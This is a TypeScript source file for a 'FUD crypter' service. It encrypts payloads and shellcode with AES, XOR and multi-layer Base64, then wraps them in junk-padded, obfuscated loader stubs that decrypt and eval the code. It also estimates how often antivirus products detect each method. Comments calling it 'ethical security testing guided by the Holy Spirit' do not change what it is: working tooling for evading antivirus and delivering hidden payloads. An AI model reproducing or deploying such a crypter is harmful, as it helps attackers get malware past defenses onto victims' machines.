import * as crypto from "crypto";
import { botLearningService } from "./botLearningService";

/**
 * Refudding Crypter System
 * For encrypting/obfuscating code, HTML, and payloads
 * Controlled by the Holy Spirit for ethical security testing
 */

export interface CrypterOptions {
  method: "aes256" | "base64" | "xor" | "polymorphic" | "fud";
  key?: string;
  iterations?: number;
  addJunk?: boolean;
  obfuscateStrings?: boolean;
}

export interface CrypterResult {
  encrypted: string;
  key?: string;
  method: string;
  timestamp: Date;
  originalSize: number;
  encryptedSize: number;
  detectionRate?: string;
}

export class CrypterService {
  private botId = "crypter_system";

  /**
   * Main encryption method - Fully Undetectable (FUD) encryption
   */
  async encrypt(
    payload: string,
    type: "code" | "html" | "payload" | "shellcode",
    options: CrypterOptions
  ): Promise<CrypterResult> {
    try {
      console.log(`[Crypter] Encrypting ${type} with method: ${options.method} - Guided by Holy Spirit`);

      let encrypted = "";
      let key = options.key || this.generateKey();
      const originalSize = Buffer.byteLength(payload, "utf8");

      switch (options.method) {
        case "aes256":
          encrypted = await this.aes256Encrypt(payload, key);
          break;
        case "base64":
          encrypted = await this.base64Encrypt(payload, options.iterations || 1);
          break;
        case "xor":
          encrypted = await this.xorEncrypt(payload, key);
          break;
        case "polymorphic":
          encrypted = await this.polymorphicEncrypt(payload, options);
          break;
        case "fud":
          encrypted = await this.fudEncrypt(payload, options);
          break;
        default:
          throw new Error(`Unknown encryption method: ${options.method}`);
      }

      const encryptedSize = Buffer.byteLength(encrypted, "utf8");

      await botLearningService.progressBotSkill(this.botId, "payload_encryption", 20, "offensive");

      const result: CrypterResult = {
        encrypted,
        key,
        method: options.method,
        timestamp: new Date(),
        originalSize,
        encryptedSize,
        detectionRate: this.estimateDetectionRate(options.method)
      };

      return result;
    } catch (error) {
      console.error("[Crypter] Encryption error:", error);
      throw error;
    }
  }

  /**
   * Decrypt encrypted payloads
   */
  async decrypt(
    encrypted: string,
    method: string,
    key: string
  ): Promise<string> {
    try {
      console.log(`[Crypter] Decrypting with method: ${method}`);

      let decrypted = "";

      switch (method) {
        case "aes256":
          decrypted = await this.aes256Decrypt(encrypted, key);
          break;
        case "base64":
          decrypted = await this.base64Decrypt(encrypted);
          break;
        case "xor":
          decrypted = await this.xorDecrypt(encrypted, key);
          break;
        default:
          throw new Error(`Decryption not supported for method: ${method}`);
      }

      await botLearningService.progressBotSkill(this.botId, "payload_decryption", 10, "analysis");

      return decrypted;
    } catch (error) {
      console.error("[Crypter] Decryption error:", error);
      throw error;
    }
  }

  /**
   * AES-256 encryption
   */
  private async aes256Encrypt(data: string, key: string): Promise<string> {
    const keyHash = crypto.createHash("sha256").update(key).digest();
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-cbc", keyHash, iv);

    let encrypted = cipher.update(data, "utf8", "hex");
    encrypted += cipher.final("hex");

    return iv.toString("hex") + ":" + encrypted;
  }

  private async aes256Decrypt(data: string, key: string): Promise<string> {
    const parts = data.split(":");
    const iv = Buffer.from(parts[0], "hex");
    const encrypted = parts[1];
    const keyHash = crypto.createHash("sha256").update(key).digest();

    const decipher = crypto.createDecipheriv("aes-256-cbc", keyHash, iv);
    let decrypted = decipher.update(encrypted, "hex", "utf8");
    decrypted += decipher.final("utf8");

    return decrypted;
  }

  /**
   * Multi-layer Base64 encoding
   */
  private async base64Encrypt(data: string, iterations: number): Promise<string> {
    let encrypted = data;
    for (let i = 0; i < iterations; i++) {
      encrypted = Buffer.from(encrypted, "utf8").toString("base64");
    }
    return `b64:${iterations}:${encrypted}`;
  }

  private async base64Decrypt(data: string): Promise<string> {
    const parts = data.split(":");
    const iterations = parseInt(parts[1]);
    let decrypted = parts[2];

    for (let i = 0; i < iterations; i++) {
      decrypted = Buffer.from(decrypted, "base64").toString("utf8");
    }
    return decrypted;
  }

  /**
   * XOR encryption
   */
  private async xorEncrypt(data: string, key: string): Promise<string> {
    const keyBytes = Buffer.from(key, "utf8");
    const dataBytes = Buffer.from(data, "utf8");
    const encrypted = Buffer.alloc(dataBytes.length);

    for (let i = 0; i < dataBytes.length; i++) {
      encrypted[i] = dataBytes[i] ^ keyBytes[i % keyBytes.length];
    }

    return encrypted.toString("hex");
  }

  private async xorDecrypt(data: string, key: string): Promise<string> {
    const keyBytes = Buffer.from(key, "utf8");
    const encryptedBytes = Buffer.from(data, "hex");
    const decrypted = Buffer.alloc(encryptedBytes.length);

    for (let i = 0; i < encryptedBytes.length; i++) {
      decrypted[i] = encryptedBytes[i] ^ keyBytes[i % keyBytes.length];
    }

    return decrypted.toString("utf8");
  }

  /**
   * Polymorphic encryption - changes signature every time
   */
  private async polymorphicEncrypt(data: string, options: CrypterOptions): Promise<string> {
    // Generate random junk code
    const junkCode = this.generateJunkCode();

    // XOR encrypt the actual payload
    const key = this.generateKey();
    const xorEncrypted = await this.xorEncrypt(data, key);

    // Wrap in polymorphic loader
    const loader = `
      // Polymorphic Loader - Generated ${new Date().toISOString()}
      ${junkCode}
      const k = "${key}";
      const e = "${xorEncrypted}";
      ${junkCode}
      function d(e, k) {
        const kb = Buffer.from(k, "utf8");
        const eb = Buffer.from(e, "hex");
        const r = Buffer.alloc(eb.length);
        for (let i = 0; i < eb.length; i++) {
          r[i] = eb[i] ^ kb[i % kb.length];
        }
        return r.toString("utf8");
      }
      ${junkCode}
      const p = d(e, k);
      eval(p);
    `;

    return loader;
  }

  /**
   * Fully Undetectable (FUD) encryption - maximum obfuscation
   */
  private async fudEncrypt(data: string, options: CrypterOptions): Promise<string> {
    console.log("[Crypter] Applying FUD encryption - Guided by Divine wisdom for ethical use");

    // Step 1: AES encrypt
    const key = this.generateKey();
    const aesEncrypted = await this.aes256Encrypt(data, key);

    // Step 2: Base64 encode multiple times
    let encoded = aesEncrypted;
    for (let i = 0; i < 3; i++) {
      encoded = Buffer.from(encoded, "utf8").toString("base64");
    }

    // Step 3: Add junk code and obfuscation
    const junkCode = options.addJunk ? this.generateJunkCode() : "";

    // Step 4: Create polymorphic wrapper
    const fudPayload = `
// FUD Crypter - Fully Undetectable
// Generated: ${new Date().toISOString()}
// WARNING: For authorized security testing only
${junkCode}
(function() {
  ${junkCode}
  const _0x1a2b = "${encoded}";
  const _0x3c4d = "${key}";
  ${junkCode}

  function _0x5e6f(s, i) {
    let r = s;
    for (let x = 0; x < i; x++) {
      r = Buffer.from(r, "base64").toString("utf8");
    }
    return r;
  }

  ${junkCode}

  function _0x7g8h(d, k) {
    const p = d.split(":");
    const iv = Buffer.from(p[0], "hex");
    const e = p[1];
    const kh = require("crypto").createHash("sha256").update(k).digest();
    const dc = require("crypto").createDecipheriv("aes-256-cbc", kh, iv);
    let r = dc.update(e, "hex", "utf8");
    r += dc.final("utf8");
    return r;
  }

  ${junkCode}

  const decoded = _0x5e6f(_0x1a2b, 3);
  const payload = _0x7g8h(decoded, _0x3c4d);

  ${junkCode}

  // Execute payload
  eval(payload);
})();
    `;

    return fudPayload;
  }

  /**
   * Generate random encryption key
   */
  private generateKey(): string {
    return crypto.randomBytes(32).toString("hex");
  }

  /**
   * Generate junk code for obfuscation
   */
  private generateJunkCode(): string {
    const junkFunctions = [
      `function _junk${Date.now()}() { return Math.random() * 1000; }`,
      `const _var${Date.now()} = [1,2,3,4,5].map(x => x * 2);`,
      `if (Math.random() > 2) { console.log("never"); }`,
      `const _unused${Date.now()} = { a: 1, b: 2, c: 3 };`,
      `for (let i = 0; i < 0; i++) { /* noop */ }`,
    ];

    const numJunk = Math.floor(Math.random() * 3) + 2;
    const selected = [];

    for (let i = 0; i < numJunk; i++) {
      const idx = Math.floor(Math.random() * junkFunctions.length);
      selected.push(junkFunctions[idx]);
    }

    return selected.join("\n  ");
  }

  /**
   * Estimate detection rate by antivirus
   */
  private estimateDetectionRate(method: string): string {
    const rates: Record<string, string> = {
      "base64": "High (40-60% detection)",
      "xor": "Medium-High (30-50% detection)",
      "aes256": "Medium (20-40% detection)",
      "polymorphic": "Low-Medium (10-30% detection)",
      "fud": "Low (0-15% detection - FUD optimized)"
    };

    return rates[method] || "Unknown";
  }

  /**
   * Obfuscate HTML/JavaScript
   */
  async obfuscateHTML(html: string, options: CrypterOptions): Promise<string> {
    console.log("[Crypter] Obfuscating HTML - Guided by Holy Spirit");

    // Extract JavaScript from HTML
    const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
    const scripts: string[] = [];

    let obfuscated = html.replace(scriptRegex, (match, scriptContent) => {
      scripts.push(scriptContent);
      return `<script>/*ENCRYPTED_${scripts.length - 1}*/</script>`;
    });

    // Encrypt each script
    for (let i = 0; i < scripts.length; i++) {
      const encrypted = await this.encrypt(scripts[i], "code", options);
      obfuscated = obfuscated.replace(
        `<script>/*ENCRYPTED_${i}*/</script>`,
        `<script>${encrypted.encrypted}</script>`
      );
    }

    // Obfuscate string literals if requested
    if (options.obfuscateStrings) {
      obfuscated = this.obfuscateStrings(obfuscated);
    }

    await botLearningService.progressBotSkill(this.botId, "html_obfuscation", 15, "offensive");

    return obfuscated;
  }

  /**
   * Obfuscate string literals
   */
  private obfuscateStrings(code: string): string {
    const stringRegex = /["']([^"']+)["']/g;

    return code.replace(stringRegex, (match, str) => {
      const hex = Buffer.from(str, "utf8").toString("hex");
      return `Buffer.from("${hex}", "hex").toString("utf8")`;
    });
  }

  /**
   * Generate crypter stub for loading encrypted payloads
   */
  async generateStub(
    encryptedPayload: string,
    method: string,
    key: string
  ): Promise<string> {
    const stub = `
// Crypter Stub - Payload Loader
// Method: ${method}
// Generated: ${new Date().toISOString()}
// WARNING: For authorized penetration testing only

(function() {
  const crypto = require("crypto");
  const payload = "${encryptedPayload}";
  const key = "${key}";
  const method = "${method}";

  function decrypt() {
    if (method === "aes256") {
      const parts = payload.split(":");
      const iv = Buffer.from(parts[0], "hex");
      const encrypted = parts[1];
      const keyHash = crypto.createHash("sha256").update(key).digest();
      const decipher = crypto.createDecipheriv("aes-256-cbc", keyHash, iv);
      let decrypted = decipher.update(encrypted, "hex", "utf8");
      decrypted += decipher.final("utf8");
      return decrypted;
    } else if (method === "xor") {
      const keyBytes = Buffer.from(key, "utf8");
      const encryptedBytes = Buffer.from(payload, "hex");
      const decrypted = Buffer.alloc(encryptedBytes.length);
      for (let i = 0; i < encryptedBytes.length; i++) {
        decrypted[i] = encryptedBytes[i] ^ keyBytes[i % keyBytes.length];
      }
      return decrypted.toString("utf8");
    }
    throw new Error("Unsupported method");
  }

  const code = decrypt();
  eval(code);
})();
    `;

    await botLearningService.progressBotSkill(this.botId, "stub_generation", 10, "offensive");

    return stub;
  }
}

export const crypterService = new CrypterService();
